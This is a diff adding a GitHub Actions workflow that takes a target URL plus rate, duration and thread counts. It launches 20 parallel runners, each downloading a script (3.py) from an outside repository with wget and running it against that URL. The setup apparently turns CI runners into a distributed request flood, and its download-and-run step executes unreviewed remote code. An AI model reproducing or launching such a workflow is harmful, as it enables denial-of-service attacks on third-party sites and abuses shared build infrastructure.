@@ -1,0 +1,48 @@
+name: Run 3.py
+
+on:
+  workflow_dispatch:
+    inputs:
+      url:
+        required: true
+        type: string
+      rate:
+        required: true
+        type: number
+      time:
+        required: true
+        type: number
+      threads:
+        required: true
+        type: number
+      port:
+        required: false
+        type: number
+      data:
+        required: false
+        type: string
+      method:
+        required: false
+        type: string
+
+jobs:
+  run:
+    runs-on: ubuntu-24.04
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v7
+      - uses: actions/setup-python@v7
+        with:
+          python-version: '3.12'
+      - name: Install Python dependencies
+        run: pip install requests
+      - name: Download 3.py
+        run: wget https://raw.githubusercontent.com/A03219026/repo-z57godx0/refs/heads/main/3.py
+      - name: Make 3.py executable
+        run: chmod +x 3.py
+      - name: Run 3.py with parameters
+        run: |
+          python3 3.py --url "${{ inputs.url }}" --rps "${{ inputs.rate }}" --duration "${{ inputs.time }}" --connections 100 --workers "${{ inputs.threads }}"
